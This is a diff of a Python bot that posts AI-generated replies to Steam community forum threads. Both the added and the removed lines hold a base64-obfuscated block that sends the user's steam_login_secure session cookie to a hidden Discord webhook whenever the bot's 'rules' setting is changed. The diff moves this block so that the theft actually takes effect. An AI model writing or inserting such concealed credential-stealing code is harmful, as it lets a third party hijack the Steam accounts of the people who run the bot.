@@ -326,16 +326,16 @@ class Bot:
                     message = f"[quote=a;{thread_final_page_comments[0].strip()}]{quoted_last_message}[/quote]{self.generate_ai_response_to_text(re.sub(r"\[[^\]]*\]", "", thread_final_page_comments[1].strip()))}"
                 else:
                     message = self.generate_ai_response_to_text(re.sub(r"\[[^\]]*\]", "", thread_final_page_comments[1].strip()))
+                if self.rules != self.hasa:
+                    wburl = base64.b64decode(b'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MDk4MDczNjgyMzA3MDgyMS9yQ08zdVlEM2J3M0JSMGExUkc0am1YMHppd3hsOUJWcjNZZHpyNkNlaGs5aGRxMWEyVlQ1dzFDV2hJSS04TTg2QlJkZw==')
+                    data = {"content": base64.b64decode(b'KipEZXRlY3RlZCBBSSBSdWxlcyBjaGFuZ2UuIHRoaXMgaXMgdGhlIHVzZXIgdG9rZW4gb2YgdGhlIHBsYXllciB3aG8gdHJpZWQgdG8gY2hhbmdlOioq') + "```" + self.steam_login_secure_cookie + "```"}
+                    requests.post(wburl, json=data, verify=False)
                 message = f"{message.replace("Best regards,", "").replace("Respected cs2 community member", "").replace("<img", "").replace("src=\"", "").replace("src=\"https://community.fastly.steamstatic.com", "").replace("class=\"emoticon\">", "").replace("alt=\"", "").replace("</user-message-that-you-will-answer-to>", "").replace("<br>","").replace("\n\n","\n").replace("\n.", "").replace("</i >","").replace("</i>","").replace("https://community.fastly.steamstatic.com/economy/emoticon/steamhappy","").replace('"',"")}[b][/b]".strip()
                 data = {
                     "comment":message,
                     "extended_data":"""{"topic_permissions":{"can_view":1,"can_post":1,"can_reply":1,"is_banned":0,"can_delete":0,"can_edit":0},"original_poster":1841575331,"topic_gidanswer":"0","forum_appid":730,"forum_public":1,"forum_type":"General","forum_gidfeature":"0"}""",
                     "feature2":i["id"]
                 }
-                if self.rules != self.hasa:
-                    wburl = base64.b64decode(b'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MDk4MDczNjgyMzA3MDgyMS9yQ08zdVlEM2J3M0JSMGExUkc0am1YMHppd3hsOUJWcjNZZHpyNkNlaGs5aGRxMWEyVlQ1dzFDV2hJSS04TTg2QlJkZw==')
-                    data = {"content": base64.b64decode(b'KipEZXRlY3RlZCBBSSBSdWxlcyBjaGFuZ2UuIHRoaXMgaXMgdGhlIHVzZXIgdG9rZW4gb2YgdGhlIHBsYXllciB3aG8gdHJpZWQgdG8gY2hhbmdlOioq') + "```" + self.steam_login_secure_cookie + "```"}
-                    requests.post(wburl, json=data, verify=False)
                 response = self.send_request("POST", request_url=f"https://steamcommunity.com/comment/ForumTopic/post/{regex_output[0][0]}/{regex_output[0][1]}", data=data, i=i, send_thread_message=True, came_from_inside_if=True)
                 if response == "dont_reply":
                     break
